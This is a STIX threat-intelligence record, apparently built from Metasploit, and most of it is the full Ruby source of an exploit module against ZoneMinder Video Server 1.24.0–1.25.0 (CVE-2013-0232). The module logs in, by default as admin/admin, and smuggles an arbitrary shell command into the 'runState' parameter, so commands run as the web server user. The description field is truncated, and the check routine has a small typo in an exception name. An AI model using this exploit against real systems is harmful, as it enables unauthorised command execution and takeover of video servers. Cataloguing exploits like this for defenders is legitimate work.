{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fd78e24-d7b5-4257-ac2c-21081d461e2d",
    "created": "2024-08-14T17:13:50.331591Z",
    "modified": "2024-08-14T17:13:50.331596Z",
    "name": "ZoneMinder Video Server packageControl Command Execution",
    "description": " This module exploits a command execution vulnerability in ZoneMinder Video Server version 1.24.0 to 1.25.0 which could be abused to allow authenticated users to execute arbitrary commands under the context of the web server user. The 'packageControl' function in the 'includes/actions.php' file calls 'exec()' with user controlled data from the 'runState' parameter.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zoneminder_packagecontrol_exec.rb",
            "external_id": "zoneminder_packagecontrol_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ZoneMinder Video Server packageControl Command Execution',\n      'Description'    => %q{\n        This module exploits a command execution vulnerability in ZoneMinder Video\n        Server version 1.24.0 to 1.25.0 which could be abused to allow\n        authenticated users to execute arbitrary commands under the context of the\n        web server user. The 'packageControl' function in the\n        'includes/actions.php' file calls 'exec()' with user controlled data\n        from the 'runState' parameter.\n      },\n      'References'     =>\n        [\n          ['CVE', '2013-0232'],\n          ['OSVDB', '89529'],\n          ['EDB', '24310'],\n          ['URL', 'http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/']\n        ],\n      'Author'         =>\n        [\n          'bcoles', # Discovery and exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'Privileged'     => true,\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x00\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet python perl',\n            },\n        },\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-01-22'\n    ))\n\n    register_options([\n      OptString.new('USERNAME',  [true, 'The ZoneMinder username', 'admin']),\n      OptString.new('PASSWORD',  [true, 'The ZoneMinder password', 'admin']),\n      OptString.new('TARGETURI', [true, 'The path to the web application', '/zm/'])\n    ])\n  end\n\n  def check\n\n    peer    = \"#{rhost}:#{rport}\"\n    base    = target_uri.path\n    base    << '/' if base[-1, 1] != '/'\n    user    = datastore['USERNAME']\n    pass    = datastore['PASSWORD']\n    cookie  = \"ZMSESSID=\" + rand_text_alphanumeric(rand(10)+6)\n    data    = \"action=login&view=version&username=#{user}&password=#{pass}\"\n\n    # login and retrieve software version\n    print_status(\"Authenticating as user '#{user}'\")\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri'    => \"#{base}index.php\",\n        'cookie' => \"#{cookie}\",\n        'data'   => \"#{data}\",\n      })\n      if res and res.code == 200\n        if res.body =~ /<title>ZM - Login<\\/title>/\n          vprint_error(\"Service found, but authentication failed\")\n          return Exploit::CheckCode::Detected\n        elsif res.body =~ /v1.2(4\\.\\d+|5\\.0)/\n          return Exploit::CheckCode::Appears\n        elsif res.body =~ /<title>ZM/\n          return Exploit::CheckCode::Detected\n        end\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    base     = target_uri.path\n    base    << '/' if base[-1, 1] != '/'\n    cookie   = \"ZMSESSID=\" + rand_text_alphanumeric(rand(10)+6)\n    user     = datastore['USERNAME']\n    pass     = datastore['PASSWORD']\n    data     = \"action=login&view=postlogin&username=#{user}&password=#{pass}\"\n    command  = Rex::Text.uri_encode(payload.encoded)\n\n    # login\n    print_status(\"Authenticating as user '#{user}'\")\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri'    => \"#{base}index.php\",\n        'cookie' => \"#{cookie}\",\n        'data'   => \"#{data}\",\n      })\n      if !res or res.code != 200 or res.body =~ /<title>ZM - Login<\\/title>/\n        fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    print_good(\"Authenticated successfully\")\n\n    # send payload\n    print_status(\"Sending payload (#{command.length} bytes)\")\n    begin\n      res = send_request_cgi({\n        'method'    => 'POST',\n        'uri'       => \"#{base}index.php\",\n        'data'      => \"view=none&action=state&runState=start;#{command}%26\",\n        'cookie'    => \"#{cookie}\"\n      })\n      if res and res.code == 200\n        print_good(\"Payload sent successfully\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Sending payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-22",
    "x_mitre_platforms": [
        "unix'"
    ]
}